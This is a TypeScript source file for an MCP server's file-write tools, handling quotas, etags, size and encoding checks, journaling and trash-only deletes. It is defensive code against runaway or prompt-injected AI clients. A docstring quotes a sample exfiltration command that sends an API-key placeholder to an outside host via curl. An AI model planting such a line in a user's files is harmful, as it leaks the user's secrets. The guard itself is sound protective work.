// The write operations behind the write tools. Every one: a Target from Folder.resolveTarget (the write
// side of the one resolver), then the existing Workspace write path (atomic, EOL / BOM / encoding kept,
// no watcher echo in this process) with the folder's commit-time guard (where the path really leads,
// the precondition, the old bytes for the journal), then a journal entry and an index update.
import fsp from 'node:fs/promises';
import { BackendFailure } from '../backend/errors';
import { decode, encode } from '../backend/textcodec';
import type { TextEncoding } from '../shared/api';
import type { Folder, Stamp, Target, TextFile } from './folders';
import type { Journal, JournalOp } from './journal';
import { ToolError } from './protocol';

/** Content one write_file call may send. */
export const MAX_WRITE_BYTES = 2 * 1024 * 1024;
/** Content one append / patch / replace call may send. */
export const MAX_EDIT_BYTES = 256 * 1024;
/** A file an edit produces (it is read whole to be edited). */
export const MAX_RESULT_BYTES = 16 * 1024 * 1024;
/** move_file: folders with more entries are refused. */
export const MAX_MOVE_ENTRIES = 500;
/** Write calls per server session, and per minute. */
export const WRITE_QUOTA = { session: 500, perMinute: 60 } as const;

/** A runaway (or prompt-injected) client cannot rewrite a whole folder in a loop. */
export class WriteQuota {
  private total = 0;
  private recent: number[] = [];
  constructor(private readonly o: { session: number; perMinute: number } = WRITE_QUOTA, private readonly now: () => number = Date.now) {}
  take() {
    const t = this.now();
    this.recent = this.recent.filter((x) => t - x < 60_000);
    if (this.total >= this.o.session) throw new ToolError('EQUOTA', `This session reached its limit of ${this.o.session} changes. Ask the user to restart the AI app's connection to continue.`);
    if (this.recent.length >= this.o.perMinute) throw new ToolError('EQUOTA', `Too many changes in a minute (at most ${this.o.perMinute}). Wait a moment, then continue.`);
    this.total++;
    this.recent.push(t);
  }
}

const PLACEHOLDER = /\{\{\s*([A-Za-z_][\w.-]*)\s*(?::[^{}\n]*)?\}\}/g;
const placeholderCounts = (text: string) => {
  const m = new Map<string, number>();
  if (text.indexOf('{{') === -1) return m;
  for (const x of text.matchAll(PLACEHOLDER)) m.set(x[1], (m.get(x[1]) ?? 0) + 1);
  return m;
};

/**
 * {{variables}} placeholders resolve to the user's values (secrets included) when they copy or run a
 * block in One. An AI edit must not add one (a new name or another use of an existing one): a planted
 * `curl https://x/?k={{api_key}}` would leak the key the next time the user runs it.
 */
export function checkPlaceholders(before: string, after: string) {
  const a = placeholderCounts(before);
  for (const [name, n] of placeholderCounts(after)) {
    if (n > (a.get(name) ?? 0)) throw new ToolError('ESECRET', `The new text adds the placeholder {{${name}}}. AI apps cannot add {{…}} placeholders: in One they fill in your values and secrets when you copy or run a block. Leave them out, or ask the user to add them.`);
  }
}

export interface WriteCtx {
  folder: Folder;
  journal: Journal;
  client: string;
  tool: string;
  /** Moves a file to the Recycle Bin / trash; throws when there is none for this path. */
  trash(abs: string): Promise<void>;
}

export const etagOf = (s: Stamp) => `${s.mtime}-${s.size}`;

/** `if_match` → the stamp it names, or a ToolError. */
export function parseEtag(v: unknown): Stamp | undefined {
  if (v === undefined) return undefined;
  const m = typeof v === 'string' ? /^(\d+(?:\.\d+)?)-(\d+)$/.exec(v.trim()) : null;
  if (!m) throw new ToolError('EINVAL', 'if_match must be an etag from read_file (like 1732190000123.45-2048)');
  return { mtime: Number(m[1]), size: Number(m[2]) };
}

export function checkEtag(key: string, st: { mtimeMs: number; size: number } | null, want: Stamp | undefined) {
  if (!want) return;
  if (!st || Math.abs(st.mtimeMs - want.mtime) > 1 || st.size !== want.size) throw new ToolError('EXTERNAL_CHANGE', `${key} changed since you read it (the etag no longer matches). Read it again, then retry.`);
}

export function checkSize(content: string, max: number, what = 'content') {
  const n = Buffer.byteLength(content, 'utf8');
  if (n > max) throw new ToolError('ETOOBIG', `${what} is too large (${Math.ceil(n / 1024)} kB; at most ${max / 1024} kB per call)`);
}

/** Text the file's own encoding cannot hold (a Windows-1252 file and an emoji) is refused, never mangled. */
function encodable(text: string, encoding: TextEncoding) {
  if (encoding !== 'windows-1252') return;
  if (decode(encode(text, encoding)).text !== text) throw new ToolError('EINVAL', 'This file is Windows-1252 encoded and cannot store some of these characters. Leave them out, or ask the user to convert the file to UTF-8.');
}

/** Backend failures → messages for the model (folder-relative path only, never a raw exception message). */
export function writeError(err: unknown, key: string): ToolError {
  if (err instanceof ToolError) return err;
  const code = err instanceof BackendFailure ? err.code : (err as NodeJS.ErrnoException)?.code;
  switch (code) {
    case 'EXTERNAL_CHANGE':
      return new ToolError('EXTERNAL_CHANGE', `${key} changed on disk meanwhile (perhaps edited in One). Read it again, then retry.`);
    case 'EEXIST':
      return new ToolError('EEXIST', `Already exists: ${key}`);
    case 'ECASE':
      return new ToolError('EEXIST', `A file whose name differs only in upper / lower case already exists: ${key}`);
    case 'ENOENT':
    case 'OUTSIDE_WORKSPACE':
      return new ToolError('ENOENT', `Not found: ${key}`);
    case 'EISDIR':
      return new ToolError('EISDIR', `Is a folder: ${key}`);
    case 'EACCES':
    case 'EPERM':
      return new ToolError('EACCES', `No permission to change ${key} (read-only on disk?)`);
    case 'EREADONLY':
      return new ToolError('EACCES', `The folder is read-only now (or no longer shared): ${key} was not changed`);
    case 'ETRASH':
      return new ToolError('ETRASH', `The Recycle Bin is not available for ${key}. Nothing was deleted.`);
    case 'ENOSPC':
      return new ToolError('ENOSPC', 'The disk is full');
    case 'EINVAL':
      return new ToolError('EINVAL', `Invalid path: ${key}`);
    default:
      console.error('[mcp] write failed', key, err);
      return new ToolError('EIO', `Could not change ${key}`);
  }
}

async function stampOf(abs: string): Promise<Stamp | null> {
  const st = await fsp.stat(abs).catch(() => null);
  return st ? { mtime: st.mtimeMs, size: st.size } : null;
}

/** Replaces the text of an existing file read as `read` (it must still be exactly that at commit time). */
export async function overwrite(c: WriteCtx, t: Target, read: TextFile, text: string, op: JournalOp, group?: string): Promise<{ etag: string; journal?: string }> {
  if (read.binary) throw new ToolError('EINVAL', `Binary file: ${t.key} cannot be written as text`);
  checkPlaceholders(read.content, text);
  encodable(text, read.encoding);
  if (Buffer.byteLength(text, 'utf8') > MAX_RESULT_BYTES) throw new ToolError('ETOOBIG', `The result would be too large (over ${MAX_RESULT_BYTES / 1048576} MB)`);
  const ws = await c.folder.workspace();
  let prev: Buffer | null = null;
  try {
    await ws.writeFile(t.key, text, { expectedMtime: read.mtime }, c.folder.guard({ expect: { mtime: read.mtime, size: read.size }, capture: (b) => (prev = b) }));
  } catch (err) {
    throw writeError(err, t.key);
  }
  const after = await stampOf(t.abs);
  const g = group ?? c.journal.newGroup();
  await c.journal.add(g, { client: c.client, tool: c.tool, root: c.folder.root, folder: c.folder.alias, op, path: t.key, after }, prev).catch((err) => console.error('[mcp] journal', err));
  c.folder.changed([{ type: 'change', path: t.key }]);
  return { etag: after ? etagOf(after) : '', journal: c.journal.enabled ? g : undefined };
}

/** Creates a new text file (LF, UTF-8; parent folders too). Fails if anything is there by then. */
export async function create(c: WriteCtx, t: Target, text: string): Promise<{ etag: string; journal?: string }> {
  checkPlaceholders('', text);
  const ws = await c.folder.workspace();
  try {
    await ws.createFile(t.key, text, c.folder.guard({ expect: 'absent' }));
  } catch (err) {
    throw writeError(err, t.key);
  }
  const after = await stampOf(t.abs);
  const g = c.journal.newGroup();
  await c.journal.add(g, { client: c.client, tool: c.tool, root: c.folder.root, folder: c.folder.alias, op: 'create', path: t.key, after }, null).catch((err) => console.error('[mcp] journal', err));
  c.folder.changed([{ type: 'add', path: t.key }]);
  return { etag: after ? etagOf(after) : '', journal: c.journal.enabled ? g : undefined };
}

export async function makeDir(c: WriteCtx, t: Target): Promise<{ journal?: string }> {
  const ws = await c.folder.workspace();
  try {
    await ws.createDir(t.key, c.folder.guard({ expect: 'absent' }));
  } catch (err) {
    throw writeError(err, t.key);
  }
  const g = c.journal.newGroup();
  await c.journal.add(g, { client: c.client, tool: c.tool, root: c.folder.root, folder: c.folder.alias, op: 'mkdir', path: t.key, dir: true, after: null }, null).catch((err) => console.error('[mcp] journal', err));
  return { journal: c.journal.enabled ? g : undefined };
}

/** To the Recycle Bin only (never a permanent delete); the old bytes go to the journal too. */
export async function trashFile(c: WriteCtx, t: Target, expect: Stamp): Promise<{ journal?: string }> {
  const ws = await c.folder.workspace();
  let prev: Buffer | null = null;
  const toBin = async (abs: string) => {
    try {
      await c.trash(abs);
    } catch {
      throw new BackendFailure('ETRASH', 'No trash');
    }
  };
  try {
    await ws.remove(t.key, toBin, c.folder.guard({ expect, capture: (b) => (prev = b) }));
  } catch (err) {
    throw writeError(err, t.key);
  }
  const g = c.journal.newGroup();
  await c.journal.add(g, { client: c.client, tool: c.tool, root: c.folder.root, folder: c.folder.alias, op: 'delete', path: t.key, after: null }, prev).catch((err) => console.error('[mcp] journal', err));
  c.folder.changed([{ type: 'unlink', path: t.key }]);
  return { journal: c.journal.enabled ? g : undefined };
}

/** Renames / moves a file or folder; refuses to overwrite. Both ends are checked again at commit time. */
export async function move(c: WriteCtx, from: Target, to: Target): Promise<void> {
  const ws = await c.folder.workspace();
  const expect = from.st?.isFile() ? { mtime: from.st.mtimeMs, size: from.st.size } : undefined;
  try {
    await ws.rename(from.key, to.key, c.folder.guard({ ...(expect ? { expect } : {}), caseRenameOf: from.key }));
  } catch (err) {
    throw writeError(err, err instanceof BackendFailure && err.code === 'EEXIST' ? to.key : from.key);
  }
}
